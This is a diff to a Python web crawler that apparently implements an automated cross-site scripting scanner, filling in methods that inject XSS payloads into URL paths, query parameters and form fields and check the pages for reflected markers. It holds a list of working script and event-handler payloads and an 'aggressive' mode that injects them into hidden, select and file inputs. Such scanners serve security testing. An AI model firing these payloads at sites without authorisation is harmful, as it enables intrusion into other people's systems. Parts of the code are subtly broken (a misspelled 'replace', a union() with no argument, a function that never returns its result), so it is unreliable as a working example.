@@ -56,8 +56,8 @@ class Request:
         return ret 
     
     def __eq__(self, other):
-        if isinstance(other, Request):  #check the object is an instance of the class 
-            return (self.url == other.url and self.method == other.method)
+        if isinstance(other, Request):  #check the other object is an instance of the Request class -> True or False
+            return (self.url == other.url and self.method == other.method) 
         return False
     
     def __hash__(self):
@@ -337,31 +337,180 @@ class Crawler:
     
     #implement these funcitons 
     def attack_404(self, driver, attack_lookup_table):
-        pass
+        successful_xss = set()
+        
+        alert_text = "jaekpot%RAND"
+        xss_payloads = ["<script>xss('"+alert_text+"')</script>",
+                        'x" onerror="xss(\''+alert_text+'\')"']
+        
+        for payload_template in xss_payloads:
+            random_id = random.randint(1,10000000)
+            random_id_padded = "(" + str(random_id) + "j"
+            payload = payload_template.replace("%RAND", random_id_padded)
+            lookup_id = alert_text.replace("%RAND", random_id_padded)
+            
+            attack_lookup_table[lookup_id] = (self.url,"404",payload)
+            
+            purl = urlparse(self.url)
+            parts = purl.path.split("/")
+            parts[-1] = payload
+            purl = purl._replace(path="/".join(parts))
+            attack_vector = purl.geturl()
+            
+            driver.get(attack_vector)
+            
+            successful_xss = successful_xss.union(self.inspect_attack(self.url))
+        
+        return successful_xss
     
     def attack_event(self, driver, vector_edge):
         pass
     
     def attack_get(self, driver, vector):
-        pass
+        
+        successful_xss = set()
+        
+        xss_payloads = self.get_payload()
+        
+        purl = urlparse(vector)
+        print(purl)
+        for parameter in purl.query.split("&"):
+            if parameter:
+                for payload_template in xss_payloads:
+                    
+                    (lookup_id, payload) = self.arm_payload(payload_template)
+                    
+                    if "=" in parameter:
+                        (key,value) = parameter.split("=", 1)
+                    else:
+                        (key,value) = (parameter, "")
+                        
+                    value = payload
+                    
+                    self.use_payload(lookup_id, (vector,key,payload))
+                    
+                    attack_query = purl.query.replace(parameter, key+"="+value)
+                    
+                    attack_vector = vector.replace(purl.query, attack_query)
+                    print("--Attack vector: ", attack_vector)
+                    
+                    driver.get(attack_vector)
+                    
+                    inspect_result = self.inspect_attack(vector)
+                    if inspect_result:
+                        successful_xss = successful_xss.union()
+                        logging.info("Found injection, don't test all")
+                        break
+        return successful_xss
     
     def xss_find_state(self, driver, edge):
-        pass
+        graph = self.graph
+        path = rec_find_path(graph, edge)
+        
+        for edge_in_path in path:
+            method = edge_in_path.value.method
+            method_data = edge_in_path.value.method_data
+            logging.info("find_state method %s" % method)
+            if method == "form":
+                form = method_data
+                try:
+                    form_fill(driver, form)
+                except:
+                    logging.error("NO FORM FILL IN xss_find_state")
     
     def fix_form(self, form, payload_template, safe_attack):
-        pass
+        alert_text = "%RAND"
+        
+        only_aggressive = ["hidden", "radio", "checkbox", "select", "file"]
+        need_aggressive = False
+        
+        for parameter in form.inputs:
+            if parameter.itype in only_aggressive:
+                need_aggressive = True
+                break
+            
+        for parameter in form.inputs:
+            (lookup_id, payload) = self.arm_payload(payload_template)    
+            if safe_attack:
+                logging.debug("Starting SAFE attack")
+                if parameter.itype in ["text", "textarea", "password", "email"]:
+                    form.inputs[parameter].value = payload
+                    self.use_payload(lookup_id, (form,parameter,payload))
+                else:
+                    logging.info("SAFE: Ignore parameter " + str(parameter))
+            elif need_aggressive:
+                logging.debug("Starting AGGRESSIVE attack")
+                if parameter.itype in ["text", "textarea", "password", "email", "hidden"]:
+                   form.inputs[parameter].value = payload
+                   self.use_payload(lookup_id, (form,parameter,payload))
+                elif parameter.itype in ["radio", "checkbox", "select"]:
+                    form.inputs[parameter].override_value = payload
+                    self.use_payload(lookup_id, (form,parameter,payload))
+                elif parameter.itype == "file":
+                    file_payload_template = "<img src=x onerror=xss(%RAND)>"
+                    (lookup_id, payload) = self.arm_payload(file_payload_template)
+                    form.inputs[parameter].value = payload
+                    self.use_payload(lookup_id, (form,parameter,payload))
+                else:
+                    logging.info("AGGRESSIVE: Ignore parameter " + str(parameter))
+        return form
+    
     
     def get_payload(self):
-        pass
+        payload = []
+        
+        alert_text = "%RAND"
+        xss_payloads = ["<script>xss("+alert_text+")</script>",
+                        "\"'><script>xss("+alert_text+")</script>",
+                        '<img src="x" onerror="xss('+alert_text+')">',
+                        '<a href="" jaekpot-attribute="'+alert_text+'">jaekpot</a>',
+                        'x" jaekpot-attribute="'+alert_text+'" fix=" ',
+                        'x" onerror="xss('+alert_text+')"',
+                        "</title></option><script>xss("+alert_text+")</script>",
+                        ]
+
+        # xss_payloads = ['<a href="" jaekpot-attribute="'+alert_text+'">jaekpot</a>']
+        return xss_payloads
     
     def arm_payload(self, payload_template):
-        pass
+        lookup_id = str(random.randint(1,100000000))
+        payload = payload_template.raplace("%RAND", lookup_id)
+        
+        return (lookup_id, payload)
     
     def use_payload(self, lookup_id, vector_with_payload):
-        pass
+        self.attack_lookup_table[str(lookup_id)] = {"injected": vector_with_payload,
+                                                    "reflected": set()}
     
     def inspect_attack(self, vector_edge):
-        pass
+        successful_xss = set()
+        
+        attribute_injects = self.driver.find_elements(By.XPATH, "//*[@jaekpot-attribute]")
+        for attribute in attribute_injects:
+            lookup_id = attribute.get_attribute("jaekpot-attribute")
+            successful_xss.add(lookup_id)
+            self.reflected_payload(lookup_id, vector_edge)
+            
+        xsses_json = self.driver.execute_script("return JSON.stringify(xss_array)")
+        lookup_ids = json.loads(xsses_json)
+        
+        for lookup_id in lookup_ids:
+            successful_xss.add(lookup_id)
+            self.reflected_payload(lookup_id, vector_edge)
+            
+        if successful_xss:
+            f = open("successful_injections-"+self.session_id+".txt", "a+")
+            for xss in successful_xss:
+                attack_entry = self.get_table_entry(xss)
+                if attack_entry:
+                    print("-"*50)
+                    print("Found vulnerability: ", attack_entry)
+                    print("-"*50)
+                    
+                    simple_entry = {'reflected': str(attack_entry['reflected']),
+                                    'injected': str(attack_entry['injected'])}
+                    
+                    f.write(json.dumps(simple_entry) + "\n")
     
     def reflected_payload(self, lookup_id, location):
         pass
@@ -464,7 +613,18 @@ class Crawler:
                 print("-"*50)
 
     def quick_check_xss(self, driver, vectors):
-        pass
+        logging.info("Starting quick scan to find stored XSS")
+        
+        successful_xss = set()
+        
+        for (vector_type, url) in vectors:
+            if vector_type == "get":
+                logging.info("-- checking: " + str(url))
+                driver.get(url)
+                
+                successful_xss = successful_xss.union(self.inspect_attack(url))
+        logging.info("-- Total: " + str(successful_xss))
+        return successful_xss
     
     def next_unvisited_edge(self,driver,graph):
         pass
